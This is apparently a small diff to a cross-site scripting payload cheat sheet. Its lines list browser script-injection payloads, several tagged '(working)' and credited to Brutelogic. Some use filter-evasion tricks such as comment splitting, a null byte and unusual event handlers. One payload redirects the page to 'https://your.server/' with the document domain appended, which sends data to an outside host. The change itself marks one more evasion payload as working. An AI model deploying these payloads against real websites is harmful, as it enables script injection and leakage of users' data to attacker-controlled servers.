@@ -17,4 +17,4 @@ javascript:{ alert`0` }
 <svg/onload=location/**/='https://your.server/'+document.domain>
 <svg onx=() onload=window.alert?.()> (working)
 test",prompt%0A/*HelloWorld*/(document.domain) (working)- Brutelogic
-"onx+%00+onpointerenter%3dalert(domain)+x" 
+"onx+%00+onpointerenter%3dalert(domain)+x" (working)- Brutelogic
